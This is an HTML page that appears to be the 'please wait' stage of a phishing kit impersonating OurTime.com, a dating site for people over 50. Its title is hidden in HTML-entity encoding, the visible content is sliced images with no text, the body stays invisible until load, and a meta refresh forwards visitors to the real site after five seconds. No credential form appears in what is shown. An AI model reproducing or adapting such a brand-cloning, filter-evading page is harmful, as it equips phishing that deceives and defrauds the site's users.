<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#80;&#108;&#101;&#97;&#115;&#101;&#32;&#87;&#97;&#105;&#116;&#32;&#124;&#32;&#79;&#117;&#114;&#84;&#105;&#109;&#101;&#46;&#99;&#111;&#109;&#32;&#45;&#32;&#84;&#104;&#101;&#32;&#53;&#48;&#43;&#32;&#83;&#105;&#110;&#103;&#108;&#101;&#32;&#78;&#101;&#116;&#119;&#111;&#114;&#107;</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	
			  <html><meta http-equiv="Refresh" content="05; url=https://www.ourtime.com/"></html>
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
<style type="text/css">
div#container
{
	position:relative;
	width: 1350px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body style="visibility:hidden" onload="unhideBody()">
<div id="container">
<div id="image6" style="position:absolute; overflow:hidden; left:306px; top:623px; width:66px; height:40px; z-index:0"><img src="images/em.png" alt="" title="" border=0 width=66 height=40></div>

<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1350px; height:82px; z-index:1"><img src="images/te1.png" alt="" title="" border=0 width=1350 height=82></div>

<div id="image2" style="position:absolute; overflow:hidden; left:101px; top:17px; width:195px; height:47px; z-index:2"><a href="#"><img src="images/te2.png" alt="" title="" border=0 width=195 height=47></a></div>

<div id="image3" style="position:absolute; overflow:hidden; left:1131px; top:9px; width:116px; height:18px; z-index:3"><a href="#"><img src="images/te3.png" alt="" title="" border=0 width=116 height=18></a></div>

<div id="image5" style="position:absolute; overflow:hidden; left:0px; top:476px; width:1349px; height:78px; z-index:4"><img src="images/te5.png" alt="" title="" border=0 width=1349 height=78></div>

<div id="image7" style="position:absolute; overflow:hidden; left:275px; top:575px; width:789px; height:32px; z-index:5"><a href="#"><img src="images/te6.png" alt="" title="" border=0 width=789 height=32></a></div>

<div id="image8" style="position:absolute; overflow:hidden; left:455px; top:496px; width:163px; height:17px; z-index:6"><a href="#"><img src="images/te7.png" alt="" title="" border=0 width=163 height=17></a></div>

<div id="image4" style="position:absolute; overflow:hidden; left:245px; top:185px; width:826px; height:249px; z-index:7"><img src="images/te22.png" alt="" title="" border=0 width=826 height=249></div>

<div id="image9" style="position:absolute; overflow:hidden; left:245px; top:103px; width:826px; height:82px; z-index:8"><img src="images/te26.png" alt="" title="" border=0 width=826 height=82></div>

<div id="image10" style="position:absolute; overflow:hidden; left:639px; top:267px; width:75px; height:75px; z-index:9"><img src="images/te.gif" alt="" title="" border=0 width=75 height=75></div>

</div>

</body>
</html>
